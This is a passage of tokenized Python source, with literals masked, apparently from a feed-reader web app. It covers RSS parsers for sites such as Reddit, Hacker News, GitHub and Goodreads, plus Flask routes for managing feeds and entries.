modified ) <EOL> if feed . bozo : <EOL> logger . warning ( "<STR_LIT>" , self . feed_name , feed . bozo_exception ) <EOL> if not feed [ '<STR_LIT>' ] : <EOL> logger . info ( '<STR_LIT>' , self . url , feed . get ( '<STR_LIT>' ) ) <EOL> return None , [ ] , None , None <EOL> etag = getattr ( feed , '<STR_LIT>' , None ) <EOL> modified = getattr ( feed , '<STR_LIT>' , None ) <EOL> entries = [ ] <EOL> for item in feed [ '<STR_LIT>' ] : <EOL> try : <EOL> entry = self . parse ( item , len ( entries ) , previous_fetch , filters ) <EOL> if entry : <EOL> entry [ '<STR_LIT>' ] = json . dumps ( item ) <EOL> entries . append ( entry ) <EOL> except Exception as error : <EOL> exc_desc_lines = traceback . format_exception_only ( type ( error ) , error ) <EOL> exc_desc = '<STR_LIT>' . join ( exc_desc_lines ) . rstrip ( ) <EOL> logger . error ( "<STR_LIT>" , <EOL> self . feed_name , <EOL> item . get ( '<STR_LIT>' ) , <EOL> exc_desc ) <EOL> logger . debug ( traceback . format_exc ( ) ) <EOL> return feed [ '<STR_LIT>' ] , entries , etag , modified <EOL> def parse ( self , item , parsed_count , previous_fetch , filters ) : <EOL> if self . should_skip ( item ) : <EOL> return <EOL> is_first_load = previous_fetch is None <EOL> published = item . get ( '<STR_LIT>' , item . get ( '<STR_LIT>' ) ) <EOL> if ( self . skip_older_than and published and to_datetime ( published ) < self . skip_older_than ) : <EOL> if not is_first_load or not self . min_amount or parsed_count >= self . min_amount : <EOL> logger . debug ( '<STR_LIT>' , item . get ( '<STR_LIT>' ) ) <EOL> return <EOL> if filters and not self . _matches ( item , filters ) : <EOL> logger . debug ( '<STR_LIT>' , item . get ( '<STR_LIT>' ) , filters ) <EOL> return <EOL> result = { } <EOL> for field in self . FIELDS : <EOL> method = '<STR_LIT>' + field <EOL> result [ field ] = getattr ( self , method ) ( item ) <EOL> return result <EOL> @ staticmethod <EOL> def should_skip ( _entry ) : <EOL> return False <EOL> @ staticmethod <EOL> def _matches ( entry , filters ) : <EOL> filters = filters . split ( '<STR_LIT>' ) <EOL> for filter in filters : <EOL> field , value = filter . strip ( ) . split ( '<STR_LIT>' ) <EOL> field = field . lower ( ) . strip ( ) <EOL> value = value . lower ( ) . strip ( ) <EOL> if value not in entry . get ( field , '<STR_LIT>' ) . lower ( ) : <EOL> return False <EOL> return True <EOL> def parse_title ( self , entry ) : <EOL> return entry . get ( '<STR_LIT>' ) or self . fetch_meta ( self . parse_content_url ( entry ) , '<STR_LIT>' ) <EOL> def parse_content_url ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] <EOL> def parse_target_url ( self , entry ) : <EOL> return self . parse_content_url ( entry ) <EOL> def parse_comments_url ( self , entry ) : <EOL> return entry . get ( '<STR_LIT>' ) <EOL> def parse_username ( self , entry ) : <EOL> author = entry . get ( '<STR_LIT>' , '<STR_LIT>' ) <EOL> if author : <EOL> author = BeautifulSoup ( author , '<STR_LIT>' ) . text <EOL> author = author . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> if '<STR_LIT>' in author : <EOL> author = author . split ( '<STR_LIT>' ) [ <NUM_LIT> ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> return author <EOL> def parse_avatar_url ( self , entry ) : <EOL> url = entry . get ( '<STR_LIT>' , { } ) . get ( '<STR_LIT>' ) <EOL> if url and requests . get ( url ) . ok : <EOL> logger . debug ( '<STR_LIT>' , url ) <EOL> return url <EOL> def parse_content_short ( self , entry ) : <EOL> content_url = self . parse_content_url ( entry ) <EOL> summary = entry . get ( '<STR_LIT>' ) <EOL> if summary : <EOL> footer = summary . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> if content_url . split ( '<STR_LIT>' ) [ <NUM_LIT> ] in footer : <EOL> summary = summary . replace ( footer , '<STR_LIT>' ) . strip ( ) <EOL> summary = html . unescape ( summary ) <EOL> else : <EOL> if not content_url : <EOL> return <EOL> summary = self . fetch_meta ( content_url , '<STR_LIT>' , '<STR_LIT>' ) <EOL> if not summary : <EOL> return <EOL> soup = BeautifulSoup ( summary , '<STR_LIT>' ) <EOL> for tag in soup ( '<STR_LIT>' ) : <EOL> tag . decompose ( ) <EOL> return str ( soup ) <EOL> def parse_content_full ( self , _entry ) : <EOL> return None <EOL> def parse_media_url ( self , entry ) : <EOL> if '<STR_LIT>' in entry : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in entry and entry [ '<STR_LIT>' ] [ <NUM_LIT> ] . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in entry : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> if soup . img : <EOL> return soup . img [ '<STR_LIT>' ] <EOL> parsed_dest_url = self . parse_content_url ( entry ) <EOL> return self . fetch_meta ( parsed_dest_url , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def parse_remote_id ( self , entry ) : <EOL> return entry . get ( '<STR_LIT>' , entry [ '<STR_LIT>' ] ) <EOL> def parse_display_date ( self , entry ) : <EOL> dt = to_datetime ( entry . get ( '<STR_LIT>' , entry . get ( '<STR_LIT>' ) ) ) <EOL> if dt > datetime . datetime . utcnow ( ) : <EOL> raise ValueError ( f"<STR_LIT>" ) <EOL> return dt <EOL> def parse_sort_date ( self , entry ) : <EOL> dt = to_datetime ( entry [ '<STR_LIT>' ] ) <EOL> if dt > datetime . datetime . utcnow ( ) : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> return dt <EOL> def parse_header ( self , entry ) : <EOL> return None <EOL> def discover_feed ( url ) : <EOL> res = requests . get ( url ) <EOL> if not res . ok : <EOL> logger . warn ( "<STR_LIT>" , url , res ) <EOL> return <EOL> parsed = feedparser . parse ( res . content ) <EOL> if not parsed . bozo : <EOL> title = parsed . feed . get ( '<STR_LIT>' ) <EOL> return url , title <EOL> soup = BeautifulSoup ( res . content , '<STR_LIT>' ) <EOL> title = scraping . extract_meta ( soup , '<STR_LIT>' , '<STR_LIT>' ) <EOL> if not title : <EOL> title = soup . find ( '<STR_LIT>' ) <EOL> if title : <EOL> title = title . text <EOL> link_types = [ "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" ] <EOL> feed_url = None <EOL> for type in link_types : <EOL> link = soup . find ( '<STR_LIT>' , type = type , href = True ) <EOL> if link : <EOL> feed_url = scraping . make_absolute ( url , link [ '<STR_LIT>' ] ) <EOL> return feed_url , title <EOL> common_paths = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> for path in common_paths : <EOL> rss_url = scraping . make_absolute ( url , path ) <EOL> res = requests . get ( rss_url ) <EOL> mime = res . headers . get ( '<STR_LIT>' , '<STR_LIT>' ) . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> if res . ok and mime . endswith ( '<STR_LIT>' ) : <EOL> return rss_url , title <EOL> return None , title <EOL> def pretty_print ( url ) : <EOL> feed = feedparser . parse ( url ) <EOL> pp = pprint . PrettyPrinter ( depth = <NUM_LIT> ) <EOL> pp . pprint ( feed ) <EOL> def to_datetime ( struct_time ) : <EOL> try : <EOL> return datetime . datetime . fromtimestamp ( time . mktime ( struct_time ) ) <EOL> except Exception : <EOL> logger . error ( "<STR_LIT>" , struct_time ) <EOL> raise <EOL> def short_date_handler ( date_str ) : <EOL> return datetime . datetime . strptime ( date_str , '<STR_LIT>' ) . timetuple ( ) <EOL> feedparser . registerDateHandler ( short_date_handler ) <EOL> class RedditInboxParser ( RSSParser ) : <EOL> "<STR_LIT>" <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> def parse_title ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] . capitalize ( ) <EOL> class RedditParser ( RSSParser ) : <EOL> "<STR_LIT>" <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url and '<STR_LIT>' not in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> link_anchor = soup . find ( "<STR_LIT>" , string = "<STR_LIT>" ) <EOL> comments_anchor = soup . find ( "<STR_LIT>" , string = "<STR_LIT>" ) <EOL> if link_anchor [ '<STR_LIT>' ] == comments_anchor [ '<STR_LIT>' ] : <EOL> link_anchor . decompose ( ) <EOL> comments_anchor . decompose ( ) <EOL> return str ( soup ) <EOL> return self . fetch_meta ( link_anchor [ '<STR_LIT>' ] , '<STR_LIT>' , '<STR_LIT>' ) <EOL> def parse_content_url ( self , entry ) : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> return soup . find ( "<STR_LIT>" , string = "<STR_LIT>" ) [ '<STR_LIT>' ] <EOL> def parse_comments_url ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] <EOL> def parse_username ( self , entry ) : <EOL> if entry . get ( '<STR_LIT>' , [ ] ) : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> return super ( ) . parse_username ( entry ) <EOL> class LobstersParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> if '<STR_LIT>' in entry [ '<STR_LIT>' ] : <EOL> url = self . parse_content_url ( entry ) <EOL> return self . fetch_meta ( url , '<STR_LIT>' , '<STR_LIT>' ) <EOL> return entry [ '<STR_LIT>' ] <EOL> def parse_username ( self , entry ) : <EOL> username = super ( ) . parse_username ( entry ) <EOL> return username . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> class HackerNewsParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url or '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> if '<STR_LIT>' in entry [ '<STR_LIT>' ] : <EOL> url = self . parse_content_url ( entry ) <EOL> return self . fetch_meta ( url , '<STR_LIT>' , '<STR_LIT>' ) <EOL> return entry [ '<STR_LIT>' ] <EOL> class GithubFeedParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url and '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] <EOL> def parse_username ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> def parse_title ( self , _entry ) : <EOL> return None <EOL> def parse_avatar_url ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> def parse_media_url ( self , _entry ) : <EOL> return None <EOL> def parse_content_url ( self , _entry ) : <EOL> return None <EOL> def parse_target_url ( self , _entry ) : <EOL> return None <EOL> class GoodreadsFeedParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url and '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> summary = html . unescape ( entry [ '<STR_LIT>' ] ) <EOL> soup = BeautifulSoup ( summary , '<STR_LIT>' ) <EOL> for img in soup ( '<STR_LIT>' ) : <EOL> img . decompose ( ) <EOL> for a in soup ( '<STR_LIT>' ) : <EOL> a [ '<STR_LIT>' ] = urllib . parse . urljoin ( '<STR_LIT>' , a [ '<STR_LIT>' ] ) <EOL> return str ( soup ) <EOL> def parse_title ( self , _entry ) : <EOL> return None <EOL> def parse_media_url ( self , _entry ) : <EOL> return None <EOL> def parse_target_url ( self , entry ) : <EOL> return entry [ '<STR_LIT>' ] <EOL> def parse_content_url ( self , _entry ) : <EOL> return None <EOL> class RevistaCrisisParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url <EOL> @ staticmethod <EOL> def should_skip ( entry ) : <EOL> return '<STR_LIT>' in entry [ '<STR_LIT>' ] or entry [ '<STR_LIT>' ] . lower ( ) . startswith ( '<STR_LIT>' ) <EOL> def parse_content_short ( self , entry ) : <EOL> return self . fetch_meta ( entry [ '<STR_LIT>' ] , '<STR_LIT>' , '<STR_LIT>' ) <EOL> class ACMQueueParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> content = self . request ( entry [ '<STR_LIT>' ] ) <EOL> soup = BeautifulSoup ( content , '<STR_LIT>' ) <EOL> title = soup . find ( '<STR_LIT>' ) <EOL> return str ( title . find_next ( '<STR_LIT>' ) ) <EOL> def parse_username ( self , entry ) : <EOL> content = self . request ( entry [ '<STR_LIT>' ] ) <EOL> soup = BeautifulSoup ( content , '<STR_LIT>' ) <EOL> title = soup . find ( '<STR_LIT>' ) <EOL> author = title . find_next ( '<STR_LIT>' ) <EOL> if author : <EOL> return author . text . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> class WikiFeaturedParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( feed_url ) : <EOL> return '<STR_LIT>' in feed_url and '<STR_LIT>' in feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> return str ( soup . find ( '<STR_LIT>' ) ) <EOL> def parse_title ( self , entry ) : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> return soup . find ( '<STR_LIT>' ) . find ( '<STR_LIT>' ) . text <EOL> class IndieBlogParser ( RSSParser ) : <EOL> @ staticmethod <EOL> def is_compatible ( _feed_url ) : <EOL> return '<STR_LIT>' in _feed_url <EOL> def parse_content_short ( self , entry ) : <EOL> soup = BeautifulSoup ( entry [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> body = soup . blockquote <EOL> body . name = '<STR_LIT>' <EOL> return str ( body ) <EOL> </s>
<s> import functools <EOL> import requests <EOL> USER_AGENT = '<STR_LIT>' <EOL> TIMEOUT_SECONDS = <NUM_LIT> <EOL> requests = requests . Session ( ) <EOL> requests . headers . update ( { '<STR_LIT>' : USER_AGENT } ) <EOL> requests . get = functools . partial ( requests . get , timeout = TIMEOUT_SECONDS ) <EOL> </s>
<s> import datetime <EOL> import pathlib <EOL> import tempfile <EOL> import flask <EOL> import sqlalchemy as sa <EOL> from flask import current_app as app <EOL> from flask_login import current_user , login_required <EOL> import feedi . models as models <EOL> import feedi . tasks as tasks <EOL> from feedi import scraping <EOL> from feedi . models import db <EOL> from feedi . parsers import mastodon , rss <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" , defaults = { '<STR_LIT>' : True } , endpoint = '<STR_LIT>' ) <EOL> @ app . route ( "<STR_LIT>" , defaults = { '<STR_LIT>' : True } , endpoint = '<STR_LIT>' ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_list ( ** filters ) : <EOL> page = flask . request . args . get ( '<STR_LIT>' ) <EOL> hide_seen = flask . session . get ( '<STR_LIT>' , True ) <EOL> ordering = flask . session . get ( '<STR_LIT>' , models . Entry . ORDER_FREQUENCY ) <EOL> filters = dict ( ** filters ) <EOL> text = flask . request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) . strip ( ) <EOL> if text : <EOL> filters [ '<STR_LIT>' ] = text <EOL> is_mixed_feed_list = filters . get ( '<STR_LIT>' ) or ( <EOL> flask . request . path == '<STR_LIT>' and not filters . get ( '<STR_LIT>' ) ) <EOL> ( entries , next_page ) = fetch_entries_page ( page , current_user . id , ordering , hide_seen , is_mixed_feed_list , <EOL> ** filters ) <EOL> if page : <EOL> return flask . render_template ( '<STR_LIT>' , <EOL> entries = entries , <EOL> filters = filters , <EOL> next_page = next_page ) <EOL> return flask . render_template ( '<STR_LIT>' , <EOL> pinned = models . Entry . select_pinned ( current_user . id , ** filters ) , <EOL> entries = entries , <EOL> next_page = next_page , <EOL> is_mixed_feed_view = is_mixed_feed_list , <EOL> filters = filters ) <EOL> def fetch_entries_page ( page_arg , <EOL> user_id , <EOL> ordering_setting , <EOL> hide_seen_setting , <EOL> is_mixed_feed_list , ** filters ) : <EOL> filters [ '<STR_LIT>' ] = is_mixed_feed_list and hide_seen_setting <EOL> ordering = ordering_setting if is_mixed_feed_list else models . Entry . ORDER_RECENCY <EOL> if page_arg : <EOL> start_at , page_num = page_arg . split ( '<STR_LIT>' ) <EOL> page_num = int ( page_num ) <EOL> start_at = datetime . datetime . fromtimestamp ( float ( start_at ) ) <EOL> else : <EOL> start_at = datetime . datetime . utcnow ( ) <EOL> page_num = <NUM_LIT> <EOL> query = models . Entry . sorted_by ( user_id , ordering , start_at , ** filters ) <EOL> entry_page = db . paginate ( query , per_page = app . config [ '<STR_LIT>' ] , page = page_num ) <EOL> next_page = f'<STR_LIT>' if entry_page . has_next else None <EOL> if entry_page . has_prev : <EOL> previous_ids = [ e . id for e in entry_page . prev ( ) . items ] <EOL> update = db . update ( models . Entry ) . where ( models . Entry . id . in_ ( previous_ids ) ) . values ( viewed = datetime . datetime . utcnow ( ) ) <EOL> db . session . execute ( update ) <EOL> db . session . commit ( ) <EOL> return entry_page , next_page <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def autocomplete ( ) : <EOL> term = flask . request . args [ '<STR_LIT>' ] . strip ( ) <EOL> options = [ ] <EOL> if term . startswith ( '<STR_LIT>' ) or term . startswith ( '<STR_LIT>' ) : <EOL> options += [ <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' , url = term ) , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' , url = term , redirect = <NUM_LIT> ) , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' , url = term ) , '<STR_LIT>' ) , <EOL> ] <EOL> if current_user . has_kindle : <EOL> options += [ ( '<STR_LIT>' , <EOL> flask . url_for ( '<STR_LIT>' , url = term ) , '<STR_LIT>' , <EOL> '<STR_LIT>' ) ] <EOL> else : <EOL> folders = db . session . scalars ( <EOL> db . select ( models . Feed . folder ) <EOL> . filter ( models . Feed . folder . icontains ( term ) , <EOL> models . Feed . user_id == current_user . id ) . distinct ( ) <EOL> ) . all ( ) <EOL> options += [ ( f , flask . url_for ( '<STR_LIT>' , folder = f ) , '<STR_LIT>' ) <EOL> for f in folders ] <EOL> feed_names = db . session . scalars ( <EOL> db . select ( models . Feed . name ) <EOL> . filter ( models . Feed . name . icontains ( term ) , <EOL> models . Feed . user_id == current_user . id <EOL> ) . distinct ( ) <EOL> ) . all ( ) <EOL> options += [ ( f , flask . url_for ( '<STR_LIT>' , feed_name = f ) , '<STR_LIT>' ) <EOL> for f in feed_names ] <EOL> options . append ( ( '<STR_LIT>' + term , flask . url_for ( '<STR_LIT>' , q = term ) , '<STR_LIT>' ) ) <EOL> options += [ ( '<STR_LIT>' + f , flask . url_for ( '<STR_LIT>' , feed_name = f ) , '<STR_LIT>' ) <EOL> for f in feed_names ] <EOL> static_options = [ <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' , favorited = True ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' , favorited = True ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' ) , '<STR_LIT>' ) , <EOL> ( '<STR_LIT>' , flask . url_for ( '<STR_LIT>' ) , '<STR_LIT>' ) <EOL> ] <EOL> for so in static_options : <EOL> if term . lower ( ) in so [ <NUM_LIT> ] . lower ( ) : <EOL> options . append ( so ) <EOL> return flask . render_template ( "<STR_LIT>" , options = options ) <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_pin ( id ) : <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if entry . pinned : <EOL> entry . pinned = None <EOL> else : <EOL> entry . fetch_content ( ) <EOL> entry . pinned = datetime . datetime . utcnow ( ) <EOL> entry . backlogged = None <EOL> db . session . commit ( ) <EOL> filters = dict ( ** flask . request . args ) <EOL> pinned = models . Entry . select_pinned ( current_user . id , ** filters ) <EOL> return flask . render_template ( "<STR_LIT>" , <EOL> is_pinned_list = True , <EOL> filters = filters , <EOL> entries = pinned ) <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_favorite ( id ) : <EOL> "<STR_LIT>" <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if entry . favorited : <EOL> entry . favorited = None <EOL> else : <EOL> entry . favorited = datetime . datetime . utcnow ( ) <EOL> db . session . commit ( ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_backlog_push ( id ) : <EOL> "<STR_LIT>" <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> entry . backlog ( ) <EOL> db . session . commit ( ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . delete ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_backlog_pop ( id ) : <EOL> "<STR_LIT>" <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if entry . backlogged : <EOL> entry . unbacklog ( ) <EOL> db . session . commit ( ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def mastodon_favorite ( id ) : <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . feed . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if not entry . feed . is_mastodon : <EOL> flask . abort ( <NUM_LIT> ) <EOL> masto_acct = entry . feed . account <EOL> mastodon . favorite ( masto_acct . app . api_base_url , <EOL> masto_acct . access_token , <EOL> entry . remote_id ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . put ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def mastodon_boost ( id ) : <EOL> entry = db . get_or_404 ( models . Entry , id ) <EOL> if entry . feed . user_id != current_user . id : <EOL> flask . abort ( <NUM_LIT> ) <EOL> if not entry . feed . is_mastodon : <EOL> flask . abort ( <NUM_LIT> ) <EOL> masto_acct = entry . feed . account <EOL> mastodon . boost ( masto_acct . app . api_base_url , <EOL> masto_acct . access_token , <EOL> entry . remote_id ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . route ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_list ( ) : <EOL> subquery = models . Feed . frequency_rank_query ( ) <EOL> feeds = db . session . execute ( db . select ( models . Feed , subquery . c . rank , sa . func . count ( <NUM_LIT> ) , <EOL> sa . func . max ( models . Entry . sort_date ) . label ( '<STR_LIT>' ) ) <EOL> . filter ( models . Feed . user_id == current_user . id ) <EOL> . join ( subquery , models . Feed . id == subquery . c . id , isouter = True ) <EOL> . join ( models . Entry , models . Feed . id == models . Entry . feed_id , isouter = True ) <EOL> . group_by ( models . Feed ) <EOL> . order_by ( sa . text ( '<STR_LIT>' ) , sa . text ( '<STR_LIT>' ) ) ) <EOL> return flask . render_template ( '<STR_LIT>' , feeds = feeds ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_add ( ) : <EOL> url = flask . request . args . get ( '<STR_LIT>' ) <EOL> name = None <EOL> error_msg = None <EOL> if url : <EOL> result = rss . discover_feed ( url ) <EOL> if result : <EOL> ( url , name ) = result <EOL> if not result or not url : <EOL> error_msg = "<STR_LIT>" <EOL> folders = db . session . scalars ( <EOL> db . select ( models . Feed . folder ) <EOL> . filter ( models . Feed . folder . isnot ( None ) , <EOL> models . Feed . folder . isnot ( '<STR_LIT>' ) ) <EOL> . filter_by ( user_id = current_user . id ) . distinct ( ) ) <EOL> return flask . render_template ( '<STR_LIT>' , <EOL> url = url , <EOL> name = name , <EOL> folders = folders , <EOL> error_msg = error_msg ) <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_add_submit ( ) : <EOL> values = { k : v . strip ( ) for k , v in flask . request . form . items ( ) if v } <EOL> if not values . get ( '<STR_LIT>' ) : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = '<STR_LIT>' , ** values ) <EOL> if not values . get ( '<STR_LIT>' ) and not values . get ( '<STR_LIT>' , '<STR_LIT>' ) . startswith ( '<STR_LIT>' ) : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = '<STR_LIT>' , ** values ) <EOL> name = values . get ( '<STR_LIT>' ) <EOL> feed = db . session . scalar ( db . select ( models . Feed ) . filter_by ( <EOL> name = name , user_id = current_user . id ) ) <EOL> if feed : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = f"<STR_LIT>" , ** values ) <EOL> feed_cls = models . Feed . resolve ( values [ '<STR_LIT>' ] ) <EOL> if not values [ '<STR_LIT>' ] . startswith ( '<STR_LIT>' ) and values . get ( '<STR_LIT>' ) : <EOL> del values [ '<STR_LIT>' ] <EOL> feed = feed_cls ( ** values ) <EOL> feed . user_id = current_user . id <EOL> db . session . add ( feed ) <EOL> db . session . flush ( ) <EOL> feed . load_icon ( ) <EOL> db . session . commit ( ) <EOL> tasks . sync_feed ( feed . id , feed . name ) . get ( ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' , feed_name = feed . name ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_edit ( feed_name ) : <EOL> feed = db . session . scalar ( db . select ( models . Feed ) . filter_by ( <EOL> name = feed_name , user_id = current_user . id ) ) <EOL> if not feed : <EOL> flask . abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> folders = db . session . scalars ( <EOL> db . select ( models . Feed . folder ) <EOL> . filter ( models . Feed . folder . isnot ( None ) , <EOL> models . Feed . folder . isnot ( '<STR_LIT>' ) ) <EOL> . filter_by ( user_id = current_user . id ) . distinct ( ) ) . all ( ) <EOL> return flask . render_template ( '<STR_LIT>' , feed = feed , folders = folders ) <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_edit_submit ( feed_name ) : <EOL> feed = db . session . scalar ( db . select ( models . Feed ) . filter_by ( <EOL> name = feed_name , user_id = current_user . id ) ) <EOL> if not feed : <EOL> flask . abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> values = flask . request . form <EOL> if not values . get ( '<STR_LIT>' ) or not values . get ( '<STR_LIT>' ) : <EOL> return flask . render_template ( '<STR_LIT>' , error_msg = '<STR_LIT>' , ** values ) <EOL> for ( attr , value ) in values . items ( ) : <EOL> setattr ( feed , attr , value . strip ( ) ) <EOL> db . session . commit ( ) <EOL> return flask . redirect ( flask . url_for ( '<STR_LIT>' ) ) <EOL> @ app . delete ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_delete ( feed_name ) : <EOL> "<STR_LIT>" <EOL> feed = db . session . scalar ( db . select ( models . Feed ) . filter_by ( <EOL> name = feed_name , user_id = current_user . id ) ) <EOL> if not feed : <EOL> flask . abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> update = db . update ( models . Entry ) . where ( ( models . Entry . feed_id == feed . id ) & ( <EOL> models . Entry . favorited . isnot ( None ) | <EOL> models . Entry . backlogged . isnot ( None ) | <EOL> models . Entry . pinned . isnot ( None ) ) ) . values ( feed_id = None ) <EOL> db . session . execute ( update ) <EOL> db . session . delete ( feed ) <EOL> db . session . commit ( ) <EOL> return '<STR_LIT>' , <NUM_LIT> <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def feed_sync ( feed_name ) : <EOL> "<STR_LIT>" <EOL> feed = db . session . scalar ( db . select ( models . Feed ) . filter_by ( <EOL> name = feed_name , user_id = current_user . id ) ) <EOL> if not feed : <EOL> flask . abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> task = tasks . sync_feed ( feed . id , feed . name , force = True ) <EOL> task . get ( ) <EOL> response = flask . make_response ( ) <EOL> response . headers [ '<STR_LIT>' ] = flask . url_for ( '<STR_LIT>' , feed_name = feed . name ) <EOL> return response <EOL> @ app . post ( "<STR_LIT>" ) <EOL> @ login_required <EOL> def entry_add ( ) : <EOL> url = flask . request . args [ '<STR_LIT>' ] <EOL> redirect = flask . request . args . get ( '<STR_LIT>' ) 